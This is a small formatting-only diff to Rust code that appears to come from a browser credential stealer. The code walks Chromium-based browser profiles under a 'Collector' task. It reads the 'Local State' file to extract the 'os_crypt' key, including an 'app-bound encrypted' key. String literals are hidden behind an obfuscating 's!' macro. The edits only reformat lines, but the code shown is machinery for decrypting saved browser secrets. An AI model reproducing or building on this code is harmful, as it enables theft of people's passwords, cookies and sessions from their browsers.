@@ -74,7 +74,7 @@ impl<C: Collector, F: FileSystem> ChromiumTask<'_, C, F> {
 
 fn get_browser<F>(filesystem: &F, browser: &ChromiumBasedBrowser) -> Option<BrowserData>
 where
-    F: FileSystem
+    F: FileSystem,
 {
     if !filesystem.is_exists(&browser.user_data) {
         return None;
@@ -93,10 +93,8 @@ where
 
     let mut profiles = vec![];
 
-
-
-    for profile in filesystem
-        .list_files_filtered(&browser.user_data, &|path| filesystem.is_dir(path))?
+    for profile in
+        filesystem.list_files_filtered(&browser.user_data, &|path| filesystem.is_dir(path))?
     {
         if let Some(profile_files) = filesystem.list_files_filtered(&profile, &is_in_profile_folder)
             && !profile_files.is_empty()
@@ -404,7 +402,9 @@ pub unsafe fn extract_app_bound_encrypted_key(user_data: &Path) -> Option<Vec<u8
 }
 
 fn extract_key(user_data: &Path, key: &str) -> Option<Vec<u8>> {
-    let bytes = StorageFileSystem.read_file(&(user_data / s!("Local State"))).ok()?;
+    let bytes = StorageFileSystem
+        .read_file(&(user_data / s!("Local State")))
+        .ok()?;
     let parsed = parse(&bytes).ok()?;
 
     let key_in_base64 = parsed.get(s!("os_crypt"))?.get(key)?.as_string()?.clone();
